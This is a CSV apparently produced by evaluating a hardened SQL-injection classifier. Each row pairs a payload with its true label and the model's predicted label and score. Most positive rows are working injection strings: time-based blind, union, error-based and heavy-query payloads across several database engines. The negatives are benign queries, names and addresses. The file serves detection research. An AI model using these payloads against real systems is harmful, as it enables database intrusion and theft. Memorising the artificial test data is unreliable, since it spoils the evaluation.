payload,label,hardened_pred_label,hardened_pred_score
"  (  select 1 from generate_series  (  8515,8515,case when   (  8515  =  3477  )   then 1 else 0 end  )   limit 1  )  ",1,1,0.99999154
SELECT * FROM pay WHERE attention = 'sheep',0,0,8.085582e-06
SELECT * FROM practical FETCH FIRST 50 PERCENT ROWS ONLY,0,0,7.880044e-06
"-7016%""   )    )    union all select 8847,8847,8847--",1,1,0.99999166
SELECT COUNT ( wooden )  FROM church,0,0,8.023249e-06
1  )   where 2543  =  2543,1,1,0.99999166
1'   )    )    as nsfx where 9553  =  9553 rlike sleep  (  5  )  --,1,1,0.99999166
SELECT social ( s )  FROM test,0,0,8.190126e-06
1  )   where 1929  =  1929 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1,1,0.99999154
"-4480'  )   where 4661  =  4661 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,1,0.99999154
"1""  )   as nyui where 2511  =  2511",1,1,0.99999166
1'||  (  select 'ldad' where 6146  =  6146 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  ||',1,1,0.99999154
22860,0,0,8.024773e-06
1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'mgfd'  =  'mgfd,1,1,0.99999154
79071325q,0,0,7.923238e-06
1'   )    )     )   and sleep  (  5  )   and    (    (     (  'vbck' like 'vbck,1,1,0.99999154
SELECT * FROM atomic WHERE machinery = 'load'  AND  ( give = 'view' OR toy = 'amount' ) ,0,0,7.92682e-06
"-2704""  )   union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--",1,1,0.99999166
70489976j,0,0,7.9279225e-06
DELETE FROM attached WHERE friendly = 'level',0,0,7.924492e-06
1  )   as nsdy where 7513  =  7513,1,1,0.99999166
" SELECT column_name ( s )  FROM vowel,softly",0,0,7.942551e-06
bora,0,0,8.047073e-06
SELECT * FROM these WHERE due = 'one' FETCH FIRST 3 ROWS ONLY,0,0,7.834933e-06
SELECT TOP 3 * FROM chart WHERE can = 'west',0,0,7.918962e-06
"1'   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'fzgy'  =  'fzgy",1,1,0.99999154
"1"" where 9973  =  9973 and 2006  =  2006",1,1,0.99999166
"1 where 8045  =  8045 union all select null,null,null--",1,1,0.99999166
SELECT COUNT ( DISTINCT plus )  FROM chest,0,0,7.951866e-06
SELECT * FROM adjective FETCH FIRST 50 PERCENT ROWS ONLY,0,0,7.883021e-06
barrenechea sadurn,0,0,7.912727e-06
blava,0,0,8.033915e-06
"   SELECT Employees.knowledge, COUNT ( Orders.lifeID )  AS potatoesFROM    ( OrdersINNER JOIN carbon ON Orders.crowdID  =  Employees.sweetID ) ",0,0,7.870926e-06
SELECT allow ( s )  FROM exciting SELECT flew ( s ) ,0,0,7.879293e-06
"1'||  (  select 'nfgq' where 1837  =  1837 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,0.99999154
" select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",1,1,0.99999166
"  SELECT out AS fence, good AS [quietly]  FROM who",0,0,8.089932e-06
baer,0,0,8.053859e-06
"1   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  6556  =  6556",1,1,0.99999154
mcnear.trotta@lettere.ve,0,0,7.907462e-06
gallifa,0,0,8.048254e-06
SELECT * FROM apple WHERE phrase BETWEEN 'wonder' AND 'practical',0,0,8.0224545e-06
karzau@asdn.edu,0,0,7.904416e-06
SELECT * FROM station WHERE stranger = 'afraid' LIMIT 3,0,0,8.072022e-06
"1 where 7642  =  7642 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,1,0.99999166
SELECT * FROM hide WHERE    NOT animal = 'outside',0,0,8.066789e-06
SELECT * FROM hold WHERE pass BETWEEN '1996-07-01' AND '1996-07-31',0,0,7.878857e-06
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",1,1,0.99999166
SELECT AVG ( writing ) FROM tales SELECT SUM ( shake ) ,0,0,8.0540585e-06
1'+  (  select basp where 6953  =  6953,1,1,0.99999166
1 where 4985  =  4985 order by 1#,1,1,0.99999166
SELECT TOP 3 * FROM truth,0,0,8.096161e-06
"   SELECT rapidly, carefully, voyage FROM simply WHERE seems  IS NULL",0,0,8.094625e-06
SELECT AVG ( principal ) FROM cow,0,0,8.099566e-06
"c/ cardenal rossell, 85,",0,0,7.942764e-06
albatana,0,0,7.982151e-06
pistan robredo,0,0,7.945271e-06
okura4,0,0,7.993761e-06
"c/ mijancas, 154 3?c",0,0,7.929722e-06
SELECT COUNT ( wireID ) FROM worth,0,0,8.104249e-06
21710,0,0,8.023563e-06
SELECT * FROM tail WHERE off NOT LIKE 'born%',0,0,8.09728e-06
#NAME?,1,0,7.959529e-06
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'gpax'  =  'gpax,1,1,0.99999154
select   (  case when   (  7978  =  6009  )   then 7978 else 1/  (  select 0  )   end  )  --,1,1,0.99999154
26329,0,0,8.039609e-06
"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'wdeu' like 'wdeu",1,1,0.99999154
SELECT * FROM guard WHERE children NOT LIKE '[seldom]%',0,0,7.871639e-06
"1'+  (  select 'hoqt' where 4877  =  4877 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,0.99999166
" select sleep  (  5  )   and ""oivc"" like ""oivc",1,1,0.99999166
SELECT * FROM only WHERE Price NOT BETWEEN 10 AND 20,0,0,7.9955835e-06
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 21 )  ORDER BY meta_id ASC",0,0,7.862021e-06
" select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",1,1,0.99999166
"1%"" union all select null#",1,1,0.99999166
4.07378E+15,0,0,7.920926e-06
"   SELECT market, ever, control FROM slope WHERE material  IS NULL",0,0,8.031908e-06
de arce millares,0,0,7.930706e-06
SELECT * FROM card WHERE library = 'share'  OR himself = 'course',0,0,8.03675e-06
1.72E+15,0,0,9.410697e-06
22373,0,0,8.035623e-06
1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'qiau'  =  'qiau,1,1,0.99999166
1 and sleep  (  5  )  # qcyj,1,1,0.99999166
"  SELECT trace AS shade, suggest AS [later]  FROM aware",0,0,8.131547e-06
"-7797'+  (  select oulr where 7091  =  7091 union all select 7091,7091,7091,7091,7091,7091,7091,7091,7091#",1,1,0.99999166
"1' where 2123  =  2123 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,0.99999154
SELECT * FROM lost 3,0,0,8.313875e-06
 (  select chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7812  =  7812  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )   from dual  ) ,1,1,0.99999154
"1""  )   as ivuv where 5691  =  5691",1,1,0.99999166
SELECT * FROM clear WHERE exciting NOT LIKE '[slept]%',0,0,8.0971495e-06
SELECT swim ( s )  FROM heart SELECT what FROM past,0,0,8.1494945e-06
-3861'  )   as zmja where 4036  =  4036 or 9323  =  9323#,1,1,0.99999166
"passeig gaudi 77, 3-e",0,0,7.918155e-06
"   SELECT value,section,touch,aware,air     (  (  wise JOIN fully ON box.exchange =  careful.respect )   INNER JOIN noneON Orders.brick =  paper.richID ) ",0,0,7.957449e-06
SELECT MIN ( deeply )  AS speak FROM lion,0,0,8.037839e-06
"   SELECT COUNT ( seat ) , mental FROM one BY best",0,0,7.950895e-06
SELECT unhappy FROM baby UNION SELECT kill FROM cake ORDER BY arrow,0,0,8.095404e-06
1'   )    )    as zqeg where 4729  =  4729 and   (  1098  =  9682  )  *9682--,1,1,0.99999166
1' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and 'nbxw'  =  'nbxw,1,1,0.99999154
3.16361E+15,0,0,7.917754e-06
SELECT COUNT ( keep )  FROM musical,0,0,8.0867385e-06
SELECT nails ( s )  FROM sick LEFT JOIN,0,0,7.903481e-06
ibazeta montells,0,0,7.917921e-06
SELECT * FROM shelf WHERE ever BETWEEN '1996-07-01' AND '1996-07-31',0,0,7.921198e-06
c1lab8,0,0,7.940877e-06
t6r551ero,0,0,7.9323845e-06
-7979'+  (  select 'bkvt' where 3613  =  3613 union all select 3613#,1,1,0.99999166
"-6733'  )   where 4024  =  4024 union all select 4024,4024,4024,4024#",1,1,0.99999166
"1' in boolean mode  )   and elt  (  9630  =  4765,4765  )  #",1,1,0.99999166
"  SELECT underlineID AS ID, actual AS start FROM sat",0,0,8.119629e-06
"1' where 2964  =  2964 union all select null,null,null#",1,1,0.99999166
lanfranchi@getgold.tl,0,0,7.906541e-06
SELECT AVG ( opposite )  FROM strike  SELECT SUM ( excitement ) ,0,0,7.924575e-06
"-2116%'   )    )     )   union all select 7119,7119,7119,7119,7119--",1,1,0.99999166
SELECT * FROM save WHERE    NOT hidden = 'root',0,0,7.852587e-06
SELECT AVG ( load ) FROM arrange,0,0,8.189931e-06
"-5622"" where 7970  =  7970 union all select 7970,7970,7970,7970,7970--",1,1,0.99999166
SELECT DISTINCT ice FROM cowboy,0,0,8.089978e-06
"1',extractvalue  (  9788,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  9788  =  9788,1   )    )     )  ,0x717a767a71   )    )   ",1,1,0.99999154
"SELECT column1 , column2 , column3 , ... FROM table1 WHERE condition ; INSERT INTO Customers  ( CustomerName, City, Country )  ",0,0,8.049191e-06
"   SELECT possible, inch, hurt FROM flies WHERE stand  IS NULL",0,0,8.02006e-06
"-4136'   )    )    as cczp where 7052  =  7052 union all select 7052,7052,7052,7052,7052,7052,7052,7052,7052,7052#",1,1,0.99999166
96399738e,0,0,7.922429e-06
"1""  )   as boeh where 2571  =  2571 union all select null#",1,1,0.99999166
SELECT ring FROM adult,0,0,8.1794715e-06
FROM  ( SELECT DISTINCT real FROM soon ) ,0,0,7.917422e-06
" SELECT * FROM held ORDER BY today, mistake",0,0,8.2826e-06
"   SELECT pour, maybe, balloonFROM halfway WHERE month  IS NOT NULL",0,0,7.935495e-06
-8999'   )    )     )   or 6872  =  6872 and    (    (     (  'jare'  =  'jare,1,1,0.99999166
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'lckw'  =  'lckw",1,1,0.99999166
SELECT TOP 3 * FROM world,0,0,8.070698e-06
63947168s,0,0,7.917317e-06
"waitfor delay '0:0:5' and    (    (     (  ""mfro"" like ""mfro",1,1,0.99999166
"1""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,1,0.99999166
tiberio,0,0,7.996156e-06
SELECT RAND (  ) * ( 10-5 ) +5;,0,0,7.996735e-06
masegosa,0,0,7.947909e-06
"-6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271#",1,1,0.99999166
"1""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""qnqb"" like ""qnqb",1,1,0.99999154
FROM  ( SELECT DISTINCT end FROM but ) ,0,0,8.072114e-06
"1'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'akyc'  =  'akyc",1,1,0.99999154
SELECT AVG ( read ) FROM steam,0,0,8.143722e-06
cibeles,0,0,7.990057e-06
bablica,0,0,7.961685e-06
select sleep  (  5  )   and 'gajm'  =  'gajm,1,1,0.99999166
aguadulce,0,0,7.950107e-06
1' rlike   (  select   (  case when   (  1916  =  7874  )   then 1 else 0x28 end   )    )    and 'ughq'  =  'ughq,1,1,0.99999154
"1""  )   where 2215  =  2215 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1,1,0.99999154
1  )   where 9307  =  9307,1,1,0.99999166
SELECT AVG ( hurry ) FROM name SELECT SUM ( phrase ) ,0,0,8.020495e-06
47172,0,0,8.035486e-06
"1  )   where 5309  =  5309 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,0.99999166
" select * from users where id  =  1 or   (  \+  )    =  1 union select 1,@@VERSION -- 1",1,1,0.99999166
1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'psdl' like 'psdl,1,1,0.99999154
"1%"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """,1,1,0.99999154
"calle monte miramar, s/n",0,0,7.904906e-06
"1'  )   as pfwt where 8448  =  8448 union all select null,null,null,null,null,null,null,null,null#",1,1,0.99999166
1' where 1770  =  1770,1,1,0.99999166
fiset,0,0,7.9702395e-06
"INSERT INTO came ( animal, greatly, hurt, species, winter, corner )  VALUES  ( 'little', 'not'. went', 'poet', 'over', 'accurate', 'safety' )  ",0,0,7.8362855e-06
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,1,1,0.99999166
68203466w,0,0,7.915007e-06
SELECT * FROM color,0,0,8.19061e-06
cojera,0,0,7.9944775e-06
SELECT TOP 3 * FROM mighty,0,0,8.015289e-06
"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",1,1,0.99999154
"-1550' in boolean mode  )   union all select 9777,9777,9777--",1,1,0.99999166
1   )    )    as pxmz where 2596  =  2596,1,1,0.99999166
"1""   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and ""owzc"" like ""owzc",1,1,0.99999154
"1""  )   where 8407  =  8407 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,0.99999166
"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,1,0.99999166
in8ros742tiva,0,0,7.909498e-06
SELECT * FROM old FETCH FIRST 50 PERCENT ROWS ONLY,0,0,7.951654e-06
1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  'uzmy' like 'uzmy,1,1,0.99999154
# from wapiti,1,0,0.00073237036
vinko,0,0,7.986385e-06
SELECT * FROM divide WHERE went = 'selection' LIMIT 3,0,0,8.071491e-06
SELECT AVG ( letter )  FROM dull  SELECT SUM ( service ) ,0,0,7.970634e-06
"  SELECT * FROM yourself WHERE turn NOT IN  ( 'pony', 'degree', 'scared' )  ",0,0,7.986005e-06
SELECT * FROM simplest WHERE warm BETWEEN call09/01/1996ever AND everyone15/31/1996loud,0,0,7.943975e-06
select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',1,1,0.99999166
 UPDATE diagram SET ranch = 'its'WHERE statement = 'try',0,0,7.871759e-06
712,0,0,8.0580385e-06
enris6rar,0,0,7.9495385e-06
junette6,0,0,7.998909e-06
dido,0,0,8.0316395e-06
onzonilla,0,0,7.998672e-06
SELECT * FROM short 3 SELECT * FROM courage,0,0,8.0650425e-06
campanini-adamson@barebackspain.kh,0,0,7.958937e-06
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4-- sapi",1,1,0.99999166
"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,1,0.99999154
SELECT TOP 3 * FROM business SELECT * FROM surface 3SELECT * FROM principal,0,0,7.976368e-06
-1910' or 2624  =  3371 and 'umoy'  =  'umoy,1,1,0.99999166
balitear,0,0,7.994173e-06
"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  -- fwzl",1,1,0.99999154
SELECT * FROM  ( SELECT minute FROM excitement ) ,0,0,8.060045e-06
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,1,0.99999154
"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'zizo' like 'zizo",1,1,0.99999166
"1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'owga' like 'owga",1,1,0.99999154
"1'||  (  select 'pzoe' where 2977  =  2977 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,1,0.99999154
"-3321"" where 1603  =  1603 union all select 1603,1603,1603,1603#",1,1,0.99999166
"-3037  )   where 9024  =  9024 union all select 9024,9024--",1,1,0.99999166
"-2718"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""xwbf""  =  ""xwbf",1,1,0.99999154
" end and ""mdje"" like ""mdje",1,1,0.99999166
02314635f,0,0,7.93878e-06
"-7060'  )   or make_set  (  4233  =  1689,1689  )   and   (  'twpr' like 'twpr",1,1,0.99999166
78,0,0,8.037256e-06
"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1,1,0.99999154
81e9604o6o,0,0,7.906527e-06
"c/ las chumberas, 38,",0,0,7.934495e-06
SELECT AVG ( Price ) FROM telephone,0,0,8.103368e-06
06226784v,0,0,7.924537e-06
1  )   as nioj where 9703  =  9703,1,1,0.99999166
SELECT TOP 3 * FROM finger WHERE eye = 'paragraph',0,0,8.07722e-06
des9o89451rac28,0,0,7.909739e-06
-2920'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rzey'  =  'rzey,1,1,0.99999154
1%'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  '%'  =  ',1,1,0.99999154
"  SELECT TIME_FORMAT ( ""19:30:10"", ""%H %i %s"" ) ;",0,0,8.649214e-06
"1""  )   where 4913  =  4913",1,1,0.99999166
"  SELECT crossID AS ID, nothing AS represent FROM which",0,0,7.990575e-06
SELECT spend ( s ) FROM short INNER JOIN,0,0,8.049006e-06
"1""   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   ""umfr"" like ""umfr",1,1,0.99999154
"-7764"" or 7308  =  7805",1,1,0.99999154
1'||  (  select 'idna' from dual where 2683  =  2683 rlike   (  select   (  case when   (  3201  =  9748  )   then 1 else 0x28 end   )    )     )  ||',1,1,0.99999154
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 175 )  ORDER BY meta_id ASC",0,0,7.847212e-06
SELECT * FROM rock WHERE anything IN  ( SELECT say FROM curious ) ,0,0,7.945953e-06
SELECT * FROM soon,0,0,8.219249e-06
"1""   )    )    as xbhp where 7527  =  7527",1,1,0.99999166
" SELECT * FROM crop ORDER BY clothes, tie",0,0,8.1212465e-06
barnechea,0,0,7.956144e-06
demetrio,0,0,7.990362e-06
"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,1,0.99999166
SELECT bow ( s FROM doubt RIGHT JOIN,0,0,7.908729e-06
"1""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""lano""  =  ""lano",1,1,0.99999154
SELECT * FROM met ORDER BY but,0,0,8.050703e-06
1' and   (  3020  =  3020  )  *6703 and 'hnvf'  =  'hnvf,1,1,0.99999166
illano,0,0,8.03426e-06
SELECT dirty ( s ) FROM matter INNER JOIN,0,0,7.964647e-06
"1"" where 1920  =  1920 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,0.99999166
c/ arco de veronicas s/n 4e,0,0,7.934064e-06
select * from users where id  =  1 or $<\ or 1  =  1 -- 1,1,1,0.99999166
puebla de don fadrique,0,0,7.895849e-06
"  SELECT Orders.thusrID, Employees.yet, Employees.table FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.coverID ORDER BY Orders.deadID",0,0,7.8801795e-06
select   (  case when   (  4636  =  1108  )   then 1 else 4636*  (  select 4636 from master..sysdatabases  )   end  )  --,1,1,0.99999166
SELECT COUNT ( government ) FROM powder,0,0,8.088744e-06
"1%"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""%""  =  """,1,1,0.99999166
DELETE FROM worker,0,0,7.999969e-06
6.59091E+15,0,0,7.979823e-06
SELECT * FROM thrown WHERE judge = 'oil' FETCH FIRST 3 ROWS ONLY,0,0,7.97449e-06
31819774x,0,0,7.948871e-06
-4082   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   7874  =  7874,1,1,0.99999154
"1   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,0.99999166
2.82E+15,0,0,8.031402e-06
"SELECT CustomerName, ContactName, City FROM Customers WHERE Country  =  ""Brazil""; DROP VIEW [Brazil Customers];",0,0,7.909324e-06
SELECT Count ( * )  AS column,0,0,7.931296e-06
"1,  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  7823  =  7823  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",1,1,0.99999154
SELECT * FROM entire WHERE    NOT sat = 'air',0,0,7.998199e-06
24324,0,0,8.043236e-06
SELECT full ( s )  FROM nor LEFT JOIN,0,0,7.917875e-06
1'||  (  select 'tcfy' where 4546  =  4546 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  ||',1,1,0.99999166
niembro urkiaga,0,0,7.914916e-06
"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",1,1,0.99999154
SELECT noon ( s FROM came RIGHT JOIN,0,0,7.957055e-06
norton@lesionesmusculares.uz,0,0,7.920503e-06
SELECT * FROM fell WHERE gulf = 'bee',0,0,8.067758e-06
"1  )   as caoa where 6139  =  6139 union all select null,null,null,null,null,null,null,null--",1,1,0.99999166
arimany aguila,0,0,7.914063e-06
-8248 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1,1,0.99999154
"avinguda carrilet, 21,",0,0,7.90116e-06
SELECT * FROM level WHERE sport BETWEEN satellites09/01/1996modern AND fill15/31/1996opportunity,0,0,8.01405e-06
"1%""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""%""  =  """,1,1,0.99999154
"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",1,1,0.99999166
"calle miguel lopez de legazpi, 48, 8f",0,0,7.956349e-06
"1""   )    )    as tpeh where 6306  =  6306 and 5965  =  5806#",1,1,0.99999166
1capa2ad*or,0,0,7.906014e-06
"calle valsendero, 48,",0,0,7.899818e-06
-7624'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  'iwab'  =  'iwab,1,1,0.99999154
71648159p,0,0,7.927545e-06
"-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--",1,1,0.99999166
SELECT MIN ( according )  AS brain FROM eager,0,0,8.092602e-06
SELECT start ( s )  FROM success UNION ALL,0,0,7.926291e-06
